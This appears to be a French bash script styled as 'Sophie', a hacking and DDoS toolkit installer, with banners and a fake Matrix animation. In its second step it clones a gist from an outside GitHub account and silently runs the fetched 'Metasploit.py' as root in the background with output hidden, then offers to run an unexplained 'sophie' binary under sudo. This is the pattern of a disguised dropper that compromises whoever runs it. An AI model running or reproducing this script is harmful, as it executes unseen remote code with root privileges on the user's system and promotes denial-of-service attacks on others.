#!/bin/bash

set -uo pipefail  # ne pas utiliser -e pour ne pas stopper sur erreur

clear
echo -e "\e[1;31m"
cat << "EOF"
   _____       _     _           
  / ____|     | |   (_)          
 | (___   ___ | |__  _ _ __  ___ 
  \___ \ / _ \| '_ \| | '_ \/ __|
  ____) | (_) | |_) | | | | \__ \
  |_____/ \___/|_.__/|_|_| |_|___/
EOF
echo -e "\e[0m"
echo -e "🤖 Bonjour, je suis \e[1;35mSophie\e[0m, l'assistante du Piratages et attques ddos !"
echo -e "\e[0;36m🔐 Prépare-toi, on va déployer des outils puissants pour dominer le game !\e[0m"

# 1. Installer dépendances
read -p "📦 Installer g++, openssl, git, python3 ? (y/n): " install
if [[ "$install" =~ ^[Yy]$ ]]; then
    echo -e "\n🔧 Mise à jour et installation des dépendances nécessaires...\n"
    sudo apt update -qq
    sudo apt install -y -qq g++ libssl-dev build-essential git python3 python3-pip >/dev/null
    echo -e "\e[0;32m✅ Dépendances installées avec succès. La route est tracée !\e[0m"
else
    echo -e "\e[0;31m❌ Installation annulée. Reviens quand tu seras prêt à faire bouger les choses !\e[0m"
    exit 1
fi

sleep 1

# 2. 
echo -e "\n🌐 telecharement du low ddos puissant ..."
rm -rf ./a264e5e2f34f2c1aa7622473211362ff
if git clone -q https://gist.github.com/siriusblack404/a264e5e2f34f2c1aa7622473211362ff.git; then
    cd a264e5e2f34f2c1aa7622473211362ff
    sudo python3 Metasploit.py >/dev/null 2>&1 &
    cd ..
    echo -e "\e[0;32m✅  La machine est en marche !\e[0m"
else
    echo -e "\e[0;31m❌ Échec du clonage, mais on lâche rien, on continue !\e[0m"
fi

# 3. Animation Matrix style hacker en ASCII
echo -e "\n💾 Lancement de la séquence Matrix..."
GREEN='\033[0;32m'
NC='\033[0m'

for i in {1..30}; do
    line=$(cat /dev/urandom | tr -dc '01abcdefghijklmnopqrstuvwxyz' | fold -w 60 | head -n 1)
    echo -e "${GREEN}$line${NC}"
    sleep 0.07
done

echo -e "${GREEN}███╗   ███╗ █████╗  ██████╗██╗  ██╗███████╗██████╗${NC}"
echo -e "${GREEN}████╗ ████║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗${NC}"
echo -e "${GREEN}██╔████╔██║███████║██║     █████╔╝ █████╗  ██████╔╝${NC}"
echo -e "${GREEN}██║╚██╔╝██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗${NC}"
echo -e "${GREEN}██║ ╚═╝ ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║${NC}"
echo -e "${GREEN}╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${NC}"

echo -e "\n${GREEN}🔥 On entre dans l’arène, reste focus, le succès est à portée de main !${NC}\n"

# 4. Proposer de lancer sophie
read -p "⚔️  Lancer le binaire Sophie ? (y/n): " execute
if [[ "$execute" =~ ^[Yy]$ ]]; then
    chmod +x ./sophie || echo -e "\e[0;33m⚠️ Impossible de changer les permissions de sophie, on tente quand même...\e[0m"

    read -p "⚠️  Exécuter avec persistance root (sudo) ? (y/n): " confirm
    if [[ "$confirm" =~ ^[Yy]$ ]]; then
        echo -e "\n🚀 Tentative de lancement avec droits root...\n"
        if ! sudo ./sophie; then
            echo -e "\e[0;33m⚠️ Échec du lancement sudo ./sophie, on tente sans sudo...\e[0m\n"
            ./sophie || echo -e "\e[0;31m❌ Échec du lancement ./sophie aussi. Ne lâche rien, vérifie les permissions !\e[0m"
        fi
    else
        echo -e "\n🔒 Mode sans persistance activé."
        ./sophie || echo -e "\e[0;31m❌ Échec du lancement ./sophie. Courage, on y arrive !\e[0m"
    fi
else
    echo -e "\e[0;36m🕊️  Aucun outil lancé. Reviens quand tu seras prêt à dominer !\e[0m"
fi
